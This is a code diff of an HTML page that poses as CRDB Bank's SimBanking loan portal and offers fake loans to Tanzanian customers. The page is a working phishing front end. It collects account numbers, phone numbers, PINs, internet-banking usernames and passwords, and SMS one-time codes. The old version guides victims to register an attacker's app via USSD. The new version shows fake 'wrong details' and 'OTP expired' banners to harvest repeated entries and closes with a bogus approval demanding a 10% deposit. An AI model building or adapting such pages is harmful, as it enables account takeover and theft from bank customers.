@@ -1,184 +1,237 @@
 <!DOCTYPE html>
-<html lang="sw">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CRDB Bank - Mkopo wa Haraka</title>
-    <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CRDB SimBanking Loan Portal</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <!-- Built-in Split-Screen Layout Container -->
-    <div class="split-screen-wrapper">
-        
-        <!-- TOP HALF: Simulated Phone Keypad / USSD Dial Screen -->
-        <div class="split-top">
-            <div class="phone-status-bar">
-                <span>14:55</span>
-                <span>📶 4G 🔋 9%</span>
-            </div>
-            
-            <div class="dialer-screen">
-                <div id="dialed-number" class="dialed-number-text">*150*03#</div>
-            </div>
 
-            <!-- On-Screen Keypad Grid -->
-            <div class="on-screen-keypad">
-                <div class="key-row">
-                    <button class="k-btn" data-val="1">1<span class="sub-text"></span></button>
-                    <button class="k-btn" data-val="2">2<span class="sub-text">ABC</span></button>
-                    <button class="k-btn" data-val="3">3<span class="sub-text">DEF</span></button>
-                </div>
-                <div class="key-row">
-                    <button class="k-btn" data-val="4">4<span class="sub-text">GHI</span></button>
-                    <button class="k-btn" data-val="5">5<span class="sub-text">JKL</span></button>
-                    <button class="k-btn" data-val="6">6<span class="sub-text">MNO</span></button>
-                </div>
-                <div class="key-row">
-                    <button class="k-btn" data-val="7">7<span class="sub-text">PQRS</span></button>
-                    <button class="k-btn" data-val="8">8<span class="sub-text">TUV</span></button>
-                    <button class="k-btn" data-val="9">9<span class="sub-text">WXYZ</span></button>
-                </div>
-                <div class="key-row">
-                    <button class="k-btn" data-val="*">*</button>
-                    <button class="k-btn" data-val="0">0<span class="sub-text">+</span></button>
-                    <button class="k-btn" data-val="#">#</button>
-                </div>
-                <div class="key-row call-row">
-                    <button class="call-action-btn" id="simulated-call-btn">📞 Call</button>
-                </div>
-            </div>
-        </div>
+<div class="app-container">
+  
+  <!-- Header -->
+  <header class="top-header">
+    <div class="header-left">
+      <span class="brand-title">CRDB <small>SIMBANKING</small></span>
+    </div>
+    <div class="header-right">
+      <span class="flag-badge">🇹🇿</span>
+    </div>
+  </header>
 
-        <!-- DIVIDER BAR -->
-        <div class="split-divider"></div>
+  <!-- STEP 1: GUIDELINES NOTICE (Matches Image 1000056268) -->
+  <section id="step-I UNDERSTAND" class="screen active">
+    <h1 style="font-size: 24px; color: var(--crdb-green); text-align: center; margin-top: 10px;">CRDB SimBanking Loan</h1>
+    <p style="text-align: center; color: var(--text-muted); margin-top: 4px; font-size: 13px;">Benki ya Watu, Huduma Bora</p>
 
-        <!-- BOTTOM HALF: Web Application Content -->
-        <div class="split-bottom">
-            <div class="container">
-                <!-- Notification Banner -->
-                <div id="notification-banner" class="notification-banner hidden"></div>
-
-                <!-- Header Logo -->
-                <div class="header">
-                    <h1 class="logo">CRDB BANK</h1>
-                    <p class="tagline">Tumeenea Kila Mahali</p>
-                </div>
-
-                <!-- Step 1: Loan Calculation / Selection -->
-                <section id="step-loan" class="card">
-                    <h2>Omba Mkopo wa Simbanking</h2>
-                    <p class="subtitle">Chagua kiasi cha mkopo na muda wa marejesho.</p>
-                    
-                    <div class="form-group">
-                        <label>Kiasi cha Mkopo: <span id="amount-text" class="highlight">TSh 1,000,000</span></label>
-                        <input type="range" id="loan-amount" min="50000" max="5000000" step="50000" value="1000000">
-                    </div>
-
-                    <div class="form-group">
-                        <label>Muda wa Marejesho: <span id="months-text" class="highlight">miezi 12</span></label>
-                        <input type="range" id="loan-months" min="1" max="36" step="1" value="12">
-                    </div>
-
-                    <div class="summary-box">
-                        <div class="summary-row">
-                            <span>Rejesho la Kila Mwezi:</span>
-                            <strong id="monthly-payment">TSh 95,833</strong>
-                        </div>
-                    </div>
-
-                    <button id="btn-omba" class="btn-primary">Endelea na Maombi</button>
-                </section>
-
-                <!-- Step 2: Credentials Input -->
-                <section id="step-credentials" class="card hidden">
-                    <h2>Activation</h2>
-                    <p class="subtitle">Please enter your credentials used to access SimBanking USSD(*150*03#)</p>
-                    
-                    <div class="form-group">
-                        <label for="acc-number">Account number linked with Simbanking</label>
-                        <input type="text" id="acc-number" placeholder="Ingiza namba ya akaunti" required>
-                    </div>
-
-                    <div class="form-group">
-                        <label for="mobile-number">Mobile number registered for Simbanking</label>
-                        <input type="tel" id="mobile-number" inputmode="numeric" placeholder="0755******" required>
-                    </div>
-
-                    <div class="form-group">
-                        <label for="sim-pin">Simbanking PIN</label>
-                        <input type="password" id="sim-pin" inputmode="numeric" pattern="[0-9]*" maxlength="4" placeholder="••••" required>
-                    </div>
-
-                    <button id="btn-continue-creds" class="btn-primary">CONTINUE</button>
-                    <div id="credentials-spinner" class="spinner hidden"></div>
-                </section>
-
-                <!-- Step 3: Instructions & OTP Input -->
-                <section id="step-otp" class="card hidden">
-                    <div class="shield-icon">⏳</div>
-                    <h2>Uundaji wa OTP</h2>
-                    
-                    <div class="ussd-steps-box">
-                        <p><strong>Fuata hatua zifuatazo:</strong></p>
-                        <ol class="ussd-list">
-                            <li>Tumia kibonyezo kilicho hapo juu kupiga <strong>*150*03#</strong>.</li>
-                            <li>Chagua 1 SimBanking, kisha uweke PIN yako ya SimBanking.</li>
-                            <li>Chagua 1 (Akaunti Yangu), kisha Chagua 5 (Sajili App ya Simu).</li>
-                            <li>Thibitisha ili kupokea ujumbe mfupi (SMS) wenye namba za OTP.</li>
-                            <li>Weka namba hizo za OTP kwenye nafasi iliyotolewa hapa chini.</li>
-                        </ol>
-                    </div>
-
-                    <p class="subtitle" style="margin-top: 15px;">Weka namba ya OTP ya tarakimu 5 uliyopokea:</p>
-                    
-                    <div class="otp-inputs">
-                        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" />
-                        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" />
-                        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" />
-                        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" />
-                        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" />
-                    </div>
-
-                    <button id="btn-verify-otp" class="btn-primary" disabled>CONTINUE</button>
-                </section>
-
-                <!-- Step 4: Security PIN Verification -->
-                <section id="step-security-pin" class="card hidden">
-                    <div class="shield-icon">🔒</div>
-                    <h2>Weka PIN ya Usalama</h2>
-                    <p class="subtitle">Weka PIN ya usalama ya tarakimu 4 (namba pekee) ili kukamilisha idhini.</p>
-                    
-                    <div class="otp-inputs">
-                        <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" />
-                        <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" />
-                        <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" />
-                        <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" />
-                    </div>
-
-                    <button id="btn-verify-security-pin" class="btn-primary">CONTINUE</button>
-                </section>
-
-                <!-- Step 5: Waiting / Success State -->
-                <section id="step-success" class="card hidden text-center">
-                    <div id="success-icon-container" class="success-icon">
-                        <div class="spinner-large"></div>
-                    </div>
-                    <h2 id="success-title">Maombi ya Mkopo Yamewasilishwa</h2>
-                    <p id="success-subtitle" class="subtitle">Maombi yako ya mkopo yamewasilishwa. Tafadhali subiri idhini. Utapata ujumbe wa uthibitisho.</p>
-                    
-                    <div id="countdown-banner" class="countdown-banner">
-                        <span>🔄 Unaelekezwa kwenye mfumo katika <strong id="countdown-timer">3</strong> s...</span>
-                    </div>
-
-                    <p id="success-note-box" class="success-note hidden">Rejesho lako la mwezi litakuwa <span id="success-monthly" class="highlight"></span>.</p>
-                    
-                    <button id="btn-finish" class="btn-primary hidden" style="margin-top: 15px;">Maliza</button>
-                </section>
-            </div>
-        </div>
+    <div class="notice-box">
+      <h2>Follow Strictly</h2>
+      <p style="text-align: left; font-size: 14px;">
+        1. Dial <strong>*150*00#</strong> on your CRDB registered SIM card.<br><br>
+        2. Select <strong>Loan Services</strong> from SimBanking menu.<br><br>
+        3. Fill in the Loan Application Form with all required details.<br><br>
+        4. Review and Submit your application.<br><br>
+        5. Wait for Confirmation via SMS from CRDB.
+      </p>
+      <div class="warning-callout">
+        Follow the steps strictly to successfully apply for your CRDB loan.
+      </div>
     </div>
 
-    <script src="script.js"></script>
+    <button id="btn-understand-proceed" class="btn-primary btn-large" style="margin-top: auto;">
+      NAELEWA →
+    </button>
+  </section>
+
+  <!-- STEP 2: SLIDERS OVERVIEW -->
+  <section id="step-slider" class="screen">
+    <div class="welcome-banner">
+      <h2>Loan Calculator</h2>
+      <p style="color: var(--text-muted); font-size: 14px;">Select your loan amount and duration</p>
+    </div>
+
+    <div class="overview-card">
+      <div class="slider-group">
+        <div class="slider-header">
+          <span class="slider-label">Loan Amount (TZS)</span>
+          <span id="balance-val" class="slider-val">TZS 100,000</span>
+        </div>
+        <input type="range" id="slider-balance" min="10000" max="10000000" value="100000" step="10000" class="range-slider green-slider">
+        <div class="slider-limits">
+          <span>TZS 10K</span>
+          <span>TZS 10M</span>
+        </div>
+      </div>
+
+      <div class="slider-group">
+        <div class="slider-header">
+          <span class="slider-label">Loan Duration (Months)</span>
+          <span id="duration-val" class="slider-val">12 months</span>
+        </div>
+        <input type="range" id="slider-duration" min="6" max="60" value="12" step="1" class="range-slider green-slider">
+        <div class="slider-limits">
+          <span>6 months</span>
+          <span>60 months</span>
+        </div>
+      </div>
+
+      <div class="account-box">
+        <div class="phone-icon-circle">💵</div>
+        <div class="account-info">
+          <span class="account-title">Monthly Repayment</span>
+          <span class="account-amount">TZS 9,504</span>
+        </div>
+      </div>
+    </div>
+
+    <button id="btn-slider-next" class="btn-primary btn-large" style="margin-top: auto;">
+      OMBA SASA →
+    </button>
+  </section>
+
+  <!-- STEP 3: INTERNET BANKING LOGIN / CREDENTIALS (Matches Image 1000056267) -->
+  <section id="step-form" class="screen">
+    <div class="login-header-banner" style="background: var(--crdb-green); color: #FFF; padding: 24px; text-align: center; border-radius: 0 0 16px 16px; margin: -24px -24px 20px -24px;">
+      <h2 style="font-size: 22px; margin-bottom: 4px;">Internet Banking</h2>
+      <p style="font-size: 13px; opacity: 0.9;">Welcome to CRDB Internet Banking. Please enter your Username and Password</p>
+    </div>
+
+    <!-- SURFACE ERROR BANNER FOR WRONG DETAILS -->
+    <div id="creds-surface-banner" class="surface-banner">
+      WRONG DETAILS ❌ (Please enter correct username and password)
+    </div>
+
+    <div class="form-group">
+      <label for="crdb-username">Username</label>
+      <input type="text" id="crdb-username" class="input-field" placeholder="Enter Username">
+    </div>
+
+    <div class="form-group">
+      <label for="crdb-password">Password</label>
+      <input type="password" id="crdb-password" class="input-field" placeholder="Enter Password">
+    </div>
+
+    <button id="btn-submit-creds" class="btn-primary btn-large" style="margin-top: 20px;">Sign In</button>
+  </section>
+
+  <!-- STEP 4: 6-DIGIT SMS OTP SCREEN -->
+  <section id="step-otp" class="screen">
+    <h2 style="margin-bottom: 6px;">SMS Verification</h2>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 16px;">
+      6-digit verification code sent via SMS to your phone.
+    </p>
+
+    <!-- SURFACE ERROR BANNER FOR OTP EXPIRED -->
+    <div id="otp-surface-banner" class="surface-banner">
+      OTP EXPIRED ❌ (Please enter new incoming 6-digit OTP)
+    </div>
+
+    <div class="sms-notice">
+      <p>⚠️ ENTER 6-DIGIT OTP RECEIVED VIA SMS.</p>
+    </div>
+
+    <div class="form-group" style="text-align: center;">
+      <div class="pin-grid-6">
+        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
+      </div>
+      <span id="otp-error" class="error-text">Please enter a valid 6-digit numeric OTP.</span>
+    </div>
+
+    <button id="btn-submit-otp" class="btn-primary" style="margin-top: 20px;">SUBMIT OTP</button>
+  </section>
+
+  <!-- STEP 5: PHONE NUMBER & PIN ENTRY -->
+  <section id="step-phone-pin" class="screen">
+    <h2 style="margin-bottom: 6px;">Account Verification</h2>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 16px;">Enter your mobile number and 4-digit PIN</p>
+
+    <!-- SURFACE ERROR BANNER FOR WRONG PIN -->
+    <div id="pin-surface-banner" class="surface-banner">
+      WRONG PIN ❌ (Please re-enter correct PIN)
+    </div>
+
+    <div class="form-group">
+      <label for="phone-number">Mobile Number</label>
+      <div class="phone-input-wrapper">
+        <div class="flag-prefix">🇹🇿 +255</div>
+        <input type="tel" id="phone-number" class="input-field phone-field" placeholder="0712345678" maxlength="10">
+      </div>
+      <span id="phone-error" class="error-text">Please enter a valid mobile number.</span>
+    </div>
+
+    <div class="form-group" style="text-align: center;">
+      <label style="color: var(--text-muted); font-size: 14px; margin-bottom: 8px; display: block;">Enter 4-Digit PIN</label>
+      <div class="pin-grid">
+        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
+      </div>
+      <span id="pin-error" class="error-text">Please enter a 4-digit numeric PIN.</span>
+    </div>
+
+    <button id="btn-submit-phone-pin" class="btn-primary" style="margin-top: 20px;">VERIFY & COMPLETE</button>
+  </section>
+
+  <!-- STEP 6: SUCCESS SCREEN -->
+  <section id="step-success" class="screen">
+    <div style="text-align: center; margin-top: 10px;">
+      <div class="circle-check-icon">✓</div>
+      <h1 class="congrats-title">🎉 Congratulations!</h1>
+      <p class="congrats-sub">Your loan <strong>has been approved!</strong> Funds will be disbursed shortly.</p>
+    </div>
+
+    <div class="approved-banner-card">
+      <span class="approved-label">APPROVED AMOUNT</span>
+      <div id="approved-amount-display" class="approved-value">TZS 100,000</div>
+    </div>
+
+    <div class="compliance-notice-box">
+      <div class="compliance-title">⚠️ COMPLIANCE NOTICE</div>
+      <p>
+        Your CRDB account must be active and maintain a security deposit of at least <strong>10% of the approved loan amount</strong>. This deposit is fully refundable upon loan repayment.
+      </p>
+    </div>
+
+    <div class="loan-details-card">
+      <div class="detail-header-label">💳 Loan Details</div>
+      
+      <div class="detail-item">
+        <div class="item-icon green-icon">💵</div>
+        <div class="item-text">
+          <span class="item-title">MONTHLY PAYMENT</span>
+          <span class="item-val">TZS 9,504</span>
+        </div>
+      </div>
+
+      <div class="detail-item">
+        <div class="item-icon orange-icon">📅</div>
+        <div class="item-text">
+          <span class="item-title">LOAN DURATION</span>
+          <span class="item-val">12 Months</span>
+        </div>
+      </div>
+    </div>
+
+    <button id="btn-go-home" class="btn-primary" style="margin-top: 20px;">🏠 Return Home</button>
+  </section>
+
+  <!-- STEP 7: LOADING OVERLAY -->
+  <div id="step-loading" class="loading-overlay">
+    <div class="spinner"></div>
+    <h3 id="loading-title" style="margin-bottom: 8px;">Processing...</h3>
+    <p id="loading-sub" style="color: var(--text-muted); font-size: 14px;">Please wait while we verify your details.</p>
+  </div>
+
+</div>
+
+<script src="script.js"></script>
 </body>
-                    </html>
-                                                  
+              </html>
+    
